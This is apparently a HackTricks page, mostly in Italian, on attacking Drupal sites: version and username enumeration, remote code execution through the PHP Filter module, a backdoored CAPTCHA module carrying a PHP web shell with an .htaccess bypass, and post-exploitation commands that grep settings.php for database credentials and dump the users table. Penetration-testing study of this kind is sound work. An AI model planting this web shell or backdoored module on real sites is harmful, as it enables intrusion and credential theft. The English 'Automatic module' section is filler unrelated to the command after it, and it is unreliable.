# Drupal

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Discovery

* Controlla **meta**
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **Nodo**: Drupal **indicizza i suoi contenuti utilizzando i nodi**. Un nodo pu√≤ **contenere qualsiasi cosa** come un post di blog, un sondaggio, un articolo, ecc. Gli URI delle pagine sono di solito nella forma `/node/<nodeid>`.
```bash
curl drupal-site.com/node/1
```
## Enumerazione

Drupal supporta **tre tipi di utenti** di default:

1. **`Amministratore`**: Questo utente ha il controllo completo sul sito web di Drupal.
2. **`Utente autenticato`**: Questi utenti possono accedere al sito web e svolgere operazioni come aggiungere e modificare articoli in base alle loro autorizzazioni.
3. **`Anonimo`**: Tutti i visitatori del sito web sono designati come anonimi. Di default, a questi utenti √® consentito solo leggere i post.

### Versione

* Verifica `/CHANGELOG.txt`
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Le installazioni pi√π recenti di Drupal di default bloccano l'accesso ai file `CHANGELOG.txt` e `README.txt`.
{% endhint %}

### Enumerazione degli username

#### Registrazione

In _/user/register_ prova semplicemente a creare un nome utente e se il nome √® gi√† stato preso verr√† notificato:

![](<../../.gitbook/assets/image (254).png>)

#### Richiesta di una nuova password

Se richiedi una nuova password per un nome utente esistente:

![](<../../.gitbook/assets/image (255).png>)

Se richiedi una nuova password per un nome utente inesistente:

![](<../../.gitbook/assets/image (256).png>)

### Ottenere il numero di utenti

Accedendo a _/user/\<numero>_ puoi vedere il numero di utenti esistenti, in questo caso sono 2 poich√© _/users/3_ restituisce un errore di non trovato:

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### Pagine nascoste

**Fuzz `/node/$` dove `$` √® un numero** (da 1 a 500 ad esempio).\
Potresti trovare **pagine nascoste** (test, dev) che non sono indicizzate dai motori di ricerca.

#### Informazioni sui moduli installati
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### Automatico

Drupal provides a module called "Automatic" that allows users to automatically perform certain tasks on their website. This module can be used to schedule tasks such as publishing content, sending emails, and executing custom scripts.

To use the Automatic module, you need to enable it in the Drupal administration panel. Once enabled, you can configure the tasks you want to automate by creating rules. These rules define the conditions that trigger the task and the actions that should be performed.

For example, you can create a rule that publishes a specific piece of content at a certain date and time. You can also create rules to send email notifications to users when certain events occur on the website.

It's important to note that the Automatic module can be a powerful tool, but it can also introduce security risks if not properly configured. Attackers can exploit misconfigured rules to gain unauthorized access to the website or perform malicious actions.

To mitigate these risks, it's recommended to follow best practices when configuring the Automatic module. This includes regularly reviewing and updating the rules, restricting access to the module to trusted users only, and monitoring the module for any suspicious activity.

By understanding how the Automatic module works and implementing proper security measures, you can leverage its automation capabilities while keeping your Drupal website secure.
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### Con il modulo PHP Filter

{% hint style="warning" %}
Nelle versioni pi√π vecchie di Drupal **(prima della versione 8)**, era possibile accedere come amministratore e **abilitare il modulo `PHP filter`**, che "Consente di valutare codice/frammenti PHP incorporati".
{% endhint %}

√à necessario che il **plugin php sia installato** (verificarlo accedendo a _/modules/php_ e se restituisce un **403**, allora **esiste**, se **non trovato**, allora il **plugin php non √® installato**)

Vai su _Moduli_ -> (**Verifica**) _PHP Filter_ -> _Salva configurazione_

![](<../../.gitbook/assets/image (247) (1).png>)

Quindi clicca su _Aggiungi contenuto_ -> Seleziona _Pagina di base_ o _Articolo_ -> Scrivi _shellcode php nel corpo_ -> Seleziona _Codice PHP_ nel formato di testo -> Seleziona _Anteprima_

![](<../../.gitbook/assets/image (253) (1).png>)

Infine, accedi al nodo appena creato:
```bash
curl http://drupal-site.local/node/3
```
### Installa il modulo PHP Filter

A partire dalla versione **8 in poi, il** [**modulo PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **non viene installato di default**. Per sfruttare questa funzionalit√†, dovremmo **installare il modulo manualmente**.

1. Scarica la versione pi√π recente del modulo dal sito di Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Una volta scaricato, vai su **`Amministrazione`** > **`Report`** > **`Aggiornamenti disponibili`**.
3. Clicca su **`Sfoglia`**`,` seleziona il file dalla directory in cui lo hai scaricato, e poi clicca su **`Installa`**.
4. Una volta installato il modulo, puoi cliccare su **`Contenuto`** e **creare una nuova pagina di base**, come abbiamo fatto nell'esempio di Drupal 7. Assicurati di **selezionare `Codice PHP` dal menu a tendina `Formato testo`**.

### Modulo con backdoor

Un modulo con backdoor pu√≤ essere creato **aggiungendo una shell a un modulo esistente**. I moduli possono essere trovati sul sito drupal.org. Scegliamo un modulo come [CAPTCHA](https://www.drupal.org/project/captcha). Scorri verso il basso e copia il link per l'archivio tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Scarica l'archivio ed estrai i suoi contenuti.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Creare una **web shell PHP** con il seguente contenuto:
```php
<?php
system($_GET["cmd"]);
?>
```
* Successivamente, dobbiamo creare un file **`.htaccess`** per ottenere l'accesso alla cartella. Questo √® necessario poich√© Drupal nega l'accesso diretto alla cartella **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* La configurazione sopra applicher√† le regole per la cartella / quando richiediamo un file in /modules. Copia entrambi questi file nella cartella captcha e crea un archivio.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Supponendo di avere **accesso amministrativo** al sito web, fare clic su **`Gestisci`** e quindi su **`Estendi`** nella barra laterale. Successivamente, fare clic sul pulsante **`+ Installa nuovo modulo`**, e saremo portati alla pagina di installazione, come ad esempio `http://drupal-site.local/admin/modules/install`. Sfogliare l'archivio Captcha con backdoor e fare clic su **`Installa`**.
* Una volta completata l'installazione, sfogliare **`/modules/captcha/shell.php`** per eseguire comandi.

## Post Esploitation

### Leggere settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### Estrarre gli utenti dal database

To dump users from the database, you can use the following steps:

1. Identify the database management system (DBMS) being used by the Drupal application. This information can usually be found in the Drupal configuration files or by querying the database directly.

2. Once you have identified the DBMS, use the appropriate tools or commands to connect to the database. For example, if the DBMS is MySQL, you can use the `mysql` command-line tool.

3. Once connected to the database, execute a query to retrieve the user information. The exact query will depend on the database schema used by Drupal, but it typically involves selecting the relevant columns from the `users` table.

4. Save the results of the query to a file or analyze them directly. This will provide you with the necessary information about the users in the Drupal application's database.

By following these steps, you can successfully dump the users from the Drupal database.
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## Riferimenti

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
